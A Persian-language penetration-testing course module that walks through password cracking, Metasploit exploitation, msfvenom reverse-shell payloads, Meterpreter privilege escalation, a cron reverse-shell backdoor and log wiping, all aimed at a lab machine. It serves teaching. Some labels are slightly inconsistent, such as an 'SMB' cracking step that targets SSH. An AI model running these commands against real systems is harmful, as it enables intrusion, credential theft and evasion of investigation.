# System Hacking (هک سیستم)

**مدت یادگیری**: ۶ ساعت
**سطح سختی**: متوسط
**پیش‌نیاز**: فایل ۰۷ (تحلیل آسیب‌پذیری)

---

## فهرست محتوا

- [فصل ۱: مقدمه و مراحل](#فصل-۱-مقدمه-و-مراحل)
- [فصل ۲: کرک پسورد](#فصل-۲-کرک-پسورد)
- [فصل ۳: چارچوب Metasploit](#فصل-۳-چارچوب-metasploit)
- [فصل ۴: Meterpreter و ارتقای دسترسی](#فصل-۴-meterpreter-و-ارتقای-دسترسی)
- [فصل ۵: حفظ دسترسی و پاک کردن ردپا](#فصل-۵-حفظ-دسترسی-و-پاک-کردن-ردپا)
- [فصل ۶: آزمایشگاه کامل](#فصل-۶-آزمایشگاه-کامل)

---

## فصل ۱: مقدمه و مراحل

### مقدمه

**System Hacking** فاز سوم هک اخلاقی است: از آسیب‌پذیری یافته‌شده استفاده می‌کنیم تا به سیستم **دسترسی** بگیریم.

> **تشبیه:** تا حالا نقشه ساختمان را کشیدیم و درِ ضعیف را پیدا کردیم؛ حالا وارد می‌شویم.

### مفاهیم اساسی

**چهار مرحله System Hacking:**
1. **Gaining Access:** ورود اولیه (کرک پسورد یا اکسپلویت).
2. **Escalating Privileges:** ارتقا از کاربر عادی به روت/ادمین.
3. **Maintaining Access:** حفظ دسترسی (Backdoor).
4. **Clearing Logs:** پاک کردن/مدیریت ردپا.

**انواع حمله ورود:**
- **کرک پسورد:** حدس، Dictionary، Brute-force، Rainbow Table.
- **اکسپلویت سرویس:** مثل EternalBlue.
- **بدافزار:** تروجان، Backdoor.

### نکات مهم (Tips & Tricks)

- ورود با **کاربر عادی** شروع می‌شود؛ هدف نهایی **روت/ادمین** است.
- در تست واقعی، فاز «Clearing Logs» به معنای **مستندسازی شواهد** است، نه حذف.
- همیشه پس از بهره‌برداری، سیستم را به حالت اول برگردانید.

### خلاصه فصل

- چهار مرحله: Access → Escalate → Maintain → Clear.
- راه‌های ورود: کرک، اکسپلویت، بدافزار.
- هدف نهایی: دسترسی سطح بالا.

---

## فصل ۲: کرک پسورد

### مقدمه

پسورد ضعیف رایج‌ترین راه ورود است. ابزارهای کرک به سه دسته تقسیم می‌شوند: آنلاین (Brute-force روی سرویس) و آفلاین (کرک هش).

### مفاهیم اساسی

**انواع حمله کرک:**
- **Dictionary Attack:** امتحان کلمات رایج.
- **Brute-force:** امتحان همه ترکیب‌ها.
- **Hybrid:** ترکیب کلمه + تغییر.
- **Rainbow Table:** جدول هش‌های از پیش محاسبه‌شده.
- **Credential Stuffing:** استفاده از رمزهای لو رفته.

**فرمت‌های هش:**
- NTLM (ویندوز)، `/etc/shadow` (لینوکس)، MD5، SHA.

### مثال عملی

```bash
# --- Hydra (آنلاین: SSH, FTP, RDP, HTTP) ---
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
hydra -L users.txt -P pass.txt ftp://192.168.56.101
hydra -l admin -P pass.txt 192.168.56.101 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# --- John the Ripper (آفلاین) ---
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=nt hashes.txt
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt

# --- Hashcat (GPU، سریع) ---
hashcat -m 1000 hashes.txt rockyou.txt          # NTLM
hashcat -m 0 hashes.txt rockyou.txt             # MD5
hashcat -m 1800 hashes.txt rockyou.txt          # sha512crypt
hashcat -m 1000 hashes.txt -a 3 ?a?a?a?a?a?a    # Brute-force ماسک

# --- جمع‌آوری هش ---
sudo responder -I eth0     # گرفتن هش‌های NTLM در شبکه
mimikatz                    # در ویندوز (نیاز به دسترسی ادمین)
```

### اشکال شایع

- **مشکل:** کرک بیش از حد طول می‌کشد → از wordlist هدفمند یا Mask استفاده کنید.
- **مشکل:** Hydra قفل حساب می‌کند → تعداد ترد و تأخیر را تنظیم کنید (`-t 4`, `-W 3`).
- **مشکل:** John فرمت هش را تشخیص نمی‌دهد → با `--format` مشخص کنید.

### نکات مهم (Tips & Tricks)

- **rockyou.txt** پرکاربردترین wordlist است (`/usr/share/wordlists/`).
- Hashcat با GPU بسیار سریع‌تر از John است.
- **Responder** برای گرفتن هش در شبکه محلی عالی است.
- همیشه **قفل حساب (Account Lockout)** را در نظر بگیرید.

### خلاصه فصل

- Hydra آنلاین، John و Hashcat آفلاین.
- Dictionary سریع، Brute-force کامل اما کند.
- wordlist هدفمند = موفقیت سریع‌تر.

---

## فصل ۳: چارچوب Metasploit

### مقدمه

**Metasploit Framework** محبوب‌ترین چارچوب بهره‌برداری است. ماژول‌های آماده آن کار را بسیار ساده می‌کند.

### مفاهیم اساسی

**اجزای Metasploit:**
- **Exploit:** کد بهره‌برداری.
- **Payload:** کاری که بعد از نفوذ انجام می‌شود.
- **Auxiliary:** ماژول‌های کمکی (اسکن، Sniff).
- **Post:** ماژول‌های پس از نفوذ.
- **Encoder:** مبهم‌سازی Payload.
- **Meterpreter:** Payload پیشرفته.

### مثال عملی

```bash
# --- شروع ---
sudo msfconsole

# --- جستجو ---
msf6 > search ms17-010
msf6 > search type:exploit platform:windows smb

# --- استفاده از اکسپلویت ---
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > show options
msf6 > set RHOSTS 192.168.56.101
msf6 > set LHOST 192.168.56.10
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > run

# --- Payload مستقل (msfvenom) ---
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw -o shell.php

# --- Listener ---
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.56.10
msf6 > set LPORT 4444
msf6 > run -j
```

### اشکال شایع

- **مشکل:** اکسپلویت کار نمی‌کند → بررسی کنید سرویس آسیب‌پذیر است و LHOST درست است.
- **مشکل:** Meterpreter برنمی‌گردد → فایروال یا آنتی‌ویروس مانع است.
- **مشکل:** `db_import` کار نمی‌کند → سرویس PostgreSQL را شروع کنید (`msfdb init`).

### نکات مهم (Tips & Tricks)

- `msfconsole` را با دیتابیس راه‌اندازی کنید تا خروجی Nmap را وارد کنید: `db_import scan.xml`.
- **LHOST** باید IP قابل‌دسترس هدف باشد (معمولاً IP شبکه Host-Only).
- `check` قبل از `run` برای بررسی آسیب‌پذیری (اگر ماژول پشتیبانی کند).

### خلاصه فصل

- Metasploit چارچوب بهره‌برداری جامع.
- msfvenom برای تولید Payload.
- multi/handler برای دریافت اتصال معکوس.

---

## فصل ۴: Meterpreter و ارتقای دسترسی

### مقدمه

**Meterpreter** یک Payload پیشرفته است که در حافظه اجرا می‌شود و قابلیت‌های زیادی دارد.

### مفاهیم اساسی

**دستورات کلیدی Meterpreter:**

| دستور | کار |
|-------|-----|
| `sysinfo` | اطلاعات سیستم |
| `getuid` | کاربر فعلی |
| `getsystem` | تلاش برای روت/ادمین |
| `ps` | لیست پروسه‌ها |
| `migrate` | انتقال به پروسه دیگر |
| `hashdump` | استخراج هش‌های پسورد |
| `shell` | پوسته سیستم |
| `upload/download` | انتقال فایل |
| `screenshot` | اسکرین‌شات |
| `keyscan_start` | کی‌لاگر |
| `background` | پس‌زمینه کردن نشست |

**ارتقای دسترسی (Privilege Escalation):**
- **لینوکس:** SUID، sudo misconfig، Kernel Exploit، Cron.
- **ویندوز:** Unquoted Service Path، AlwaysInstallElevated، Token Impersonation.

### مثال عملی

```bash
# --- در Meterpreter ---
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem
meterpreter > ps
meterpreter > migrate 1234
meterpreter > hashdump
meterpreter > shell
# در پوسته:
C:\> whoami /priv

# --- ارتقای دسترسی لینوکس ---
# جستجوی فایل‌های SUID
find / -perm -4000 -type f 2>/dev/null
# بررسی sudo
sudo -l
# جستجوی Cron
cat /etc/crontab
ls -la /etc/cron*

# --- با Metasploit post modules ---
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run
```

### اشکال شایع

- **مشکل:** `getsystem` شکست می‌خورد → از local_exploit_suggester استفاده کنید.
- **مشکل:** بعد از `migrate` نشست قطع می‌شود → پروسه پایدار انتخاب کنید (مثل `explorer.exe`).

### نکات مهم (Tips & Tricks)

- `local_exploit_suggester` بهترین دوست شماست.
- قبل از `migrate`، پروسه هدف را بررسی کنید.
- در لینوکس، `sudo -l` و فایل‌های SUID اولین مکان جستجو هستند.

### خلاصه فصل

- Meterpreter قابلیت‌های گسترده دارد.
- getsystem + local_exploit_suggester برای ارتقا.
- SUID و sudo misconfig در لینوکس کلیدی‌اند.

---

## فصل ۵: حفظ دسترسی و پاک کردن ردپا

### مقدمه

پس از ورود، باید دسترسی را **پایدار** کنیم و ردپا را **مدیریت** کنیم (در تست واقعی: مستندسازی).

### مفاهیم اساسی

**روش‌های حفظ دسترسی:**
- **Backdoor:** درِ پشتی مخفی.
- **Rootkit:** بدافزار سطح هسته برای مخفی ماندن.
- **Scheduled Task/Cron:** اجرای دوره‌ای.
- **Startup Item:** اجرا در بوت.
- **Service:** نصب به‌عنوان سرویس.

**پاک کردن/مدیریت ردپا:**
- پاک کردن لاگ‌های ویندوز (Event Log).
- پاک کردن `/var/log/*` در لینوکس.
- حذف فایل‌های موقت و دستورات History.
- تغییر Timestamp فایل‌ها.

### مثال عملی

```bash
# --- Backdoor با Metasploit persistence ---
msf6 > use post/windows/manage/persistence_exe
msf6 > set SESSION 1
msf6 > run

# --- Cron Backdoor (لینوکس) ---
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'" | crontab -

# --- پاک کردن لاگ (فقط در محیط تست) ---
# لینوکس:
history -c
rm ~/.bash_history
# ویندوز:
wevtutil cl System
wevtutil cl Security
clear-eventlog -LogName Security
```

> **هشدار مهم:** در تست نفوذ واقعی، **هرگز** لاگ‌ها را پاک نکنید — این کار غیرقانونی و مانع بررسی است. فقط مستندسازی کنید.

### اشکال شایع

- **مشکل:** Backdoor بعد از ریبوت از کار می‌افتد → از Scheduled Task یا Service استفاده کنید.
- **مشکل:** Rootkit آنتی‌ویروس را فعال می‌کند → در محیط تست با آنتی‌ویروس خاموش کار کنید.

### نکات مهم (Tips & Tricks)

- پایداری (Persistence) باید **مخفی** و **مقاوم** باشد.
- در تست واقعی، پایداری را با هماهنگی مشتری و برای مدت محدود برقرار کنید.
- مستندسازی کامل = بخشی از حرفه‌ای بودن.

### خلاصه فصل

- پایداری: Backdoor، Rootkit، Cron، Service.
- مدیریت ردپا: لاگ‌ها، History، Timestamp.
- در تست واقعی: مستندسازی، نه حذف.

---

## فصل ۶: آزمایشگاه کامل

### مقدمه

بیایید کل زنجیره را روی Metasploitable2 اجرا کنیم: از اسکن تا روت.

### مثال عملی — زنجیره کامل

```bash
TARGET=192.168.56.101
LHOST=192.168.56.10

# === ۱. اسکن ===
sudo nmap -sV -p- $TARGET

# === ۲. بهره‌برداری با vsftpd 2.3.4 backdoor ===
msfconsole -q
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS $TARGET
msf6 > run
# → شل روت به‌دست می‌آید!

# === ۳. کرک پسورد SMB ===
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://$TARGET

# === ۴. اکسپلویت وب (DVWA) و ارتقا ===
# از SQL Injection (فایل ۱۶) برای گرفتن شل استفاده کنید

# === ۵. حفظ دسترسی ===
# نصب یک Backdoor ساده (در محیط تست)

# === ۶. مستندسازی ===
echo "Target: $TARGET | Access: root | Method: vsftpd backdoor" > findings.txt
```

### اشکال شایع

- **مشکل:** نشست Meterpreter برنمی‌گردد → LHOST و شبکه را بررسی کنید.
- **مشکل:** سیستم هدف کرش می‌کند → اسنپ‌شات داشته باشید و بازیابی کنید.

### نکات مهم (Tips & Tricks)

- همیشه **اسنپ‌شات** قبل از بهره‌برداری بگیرید.
- یافته‌ها را **لحظه‌به‌لحظه** مستند کنید.
- بعد از تمرین، سیستم را به حالت اول برگردانید.

### خلاصه فصل

- زنجیره کامل: اسکن → بهره‌برداری → ارتقا → پایداری → مستندسازی.
- Metasploitable2 هدف تمرینی عالی است.
- مستندسازی و بازیابی بخشی از فرآیند حرفه‌ای است.

---

## منابع و مراجع

- **Metasploit Unleashed:** https://www.offensive-security.com/metasploit-unleashed/
- **Hydra:** https://github.com/vanhauser-thc/thc-hydra
- **John the Ripper:** https://www.openwall.com/john/
- **Hashcat:** https://hashcat.net/hashcat/
- **Responder:** https://github.com/lgandx/Responder
- **Mimikatz:** https://github.com/gentilkiwi/mimikatz
- **GTFOBins (PrivEsc لینوکس):** https://gtfobins.github.io/
- **LOLBAS (PrivEsc ویندوز):** https://lolbas-project.github.io/
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
